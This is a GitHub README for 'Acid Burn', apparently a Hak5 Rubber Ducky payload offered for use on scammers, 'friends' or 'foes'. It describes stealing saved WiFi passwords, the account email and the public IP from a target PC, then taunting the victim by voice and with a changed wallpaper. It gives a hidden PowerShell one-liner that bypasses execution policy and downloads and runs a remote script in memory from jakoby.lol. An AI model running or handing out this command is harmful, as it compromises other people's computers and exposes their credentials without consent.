![Logo](https://github.com/I-Am-Jakoby/hak5-submissions/blob/main/Assets/logo-170-px.png?raw=true)

<!-- TABLE OF CONTENTS -->
<details>
  <summary>Table of Contents</summary>
  <ol>
    <li><a href="#Description">Description</a></li>
    <li><a href="#getting-started">Getting Started</a></li>
    <li><a href="#Contributing">Contributing</a></li>
    <li><a href="#Version-History">Version History</a></li>
    <li><a href="#Contact">Contact</a></li>
    <li><a href="#Acknowledgments">Acknowledgments</a></li>
  </ol>
</details>

# Acid Burn

A script I put together to torment Call Center Scammers but can be used on your friends as well...or foes.

## Description

This program enumerates a target PC to include Operating System, RAM Capacity, Public IP, and Email associated with the Microsoft account.
The SSID and WiFi password of any current or previously connected to networks.
It determines the last day they changed their password and how many days ago.
Once the information is gathered, the script will pause until a mouse movement is detected.
Then, the script uses Sapi speak to roast their set up and lack of security.
If wifi networks and passwords are detected, the wallpaper will be changed to an image displaying that information.
The generated image will be saved to the desktop and steganography is used to put a hidden message at the bottom of the binary output of the generated image.

## Getting Started

### Dependencies

* Windows 10,11

<p align="right">(<a href="#top">back to top</a>)</p>

### Executing program

```
powershell -w h -NoP -NonI -Exec Bypass irm jakoby.lol/zyg | iex
```

* Invoke-WebRequest will be entered in the Run Box to download and execute the script from memory
* Enumerate and get Full Name, Amount of RAM, Public IP, Wifi Password Length, Wifi Networks and Passwords, Day Password was last changed, Email
* Custom responses have been programmed to roast the target based on the information gathered during enumeration phase 
* Wifi Networks and passwords will be generated into an image that will be saved on the desktop
* Image opened in notepad will reveal a hidden message at the bottom of the binary output
* Script will freeze until a mouse movement is detected 
* Sapi Speak will be used to speak out loud the custom responses 
* Desktop wallpaper will be changed to the image of the targets Wifi Networks and Passwords
* Text file will be left on the target desktop with whatever message you choose

![alt text](https://github.com/I-Am-Jakoby/hak5-submissions/blob/main/RubberDucky/Payloads/RD-AcidBurn/hacked-wallpaper.jpg)

<p align="right">(<a href="#top">back to top</a>)</p>

## Contributing

All contributors names will be listed here

I am Jakoby

Arf

<p align="right">(<a href="#top">back to top</a>)</p>

## Version History

* 0.1
    * Initial Release

<p align="right">(<a href="#top">back to top</a>)</p>

<!-- CONTACT -->
## Contact

<h2 align="center">📱 My Socials 📱</h2>
<div align=center>
<table>
  <tr>
    <td align="center" width="96">
      <a href="https://youtube.com/c/IamJakoby?sub_confirmation=1">
        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/youtube-svgrepo-com.svg width="48" height="48" alt="C#" />
      </a>
      <br>YouTube
    </td>
    <td align="center" width="96">
      <a href="https://twitter.com/I_Am_Jakoby">
        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/twitter.png width="48" height="48" alt="Python" />
      </a>
      <br>Twitter
    </td>
    <td align="center" width="96">
      <a href="https://www.instagram.com/i_am_jakoby/">
        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/insta.png width="48" height="48" alt="Golang" />
      </a>
      <br>Instagram
    </td>
    <td align="center" width="96">
      <a href="https://discord.gg/MYYER2ZcJF">
        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/discord-v2-svgrepo-com.svg width="48" height="48" alt="Jsonnet" />
      </a>
      <br>Discord
    </td>
    <td align="center" width="96">
      <a href="https://www.tiktok.com/@i_am_jakoby?lang=en">
        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/raw/main/img/tiktok.svg width="48" height="48" alt="Jsonnet" />
      </a>
      <br>TikTok
    </td>    
  </tr>
</table>
</div>



<p align="right">(<a href="#top">back to top</a>)</p>

<!-- ACKNOWLEDGMENTS -->
## Acknowledgments

* [Hak5](https://hak5.org/)
* [MG](https://github.com/OMG-MG)
* [0iphor13](https://github.com/0iphor13)
* [PhilSutter](https://github.com/PhilSutter)


<p align="right">(<a href="#top">back to top</a>)</p>
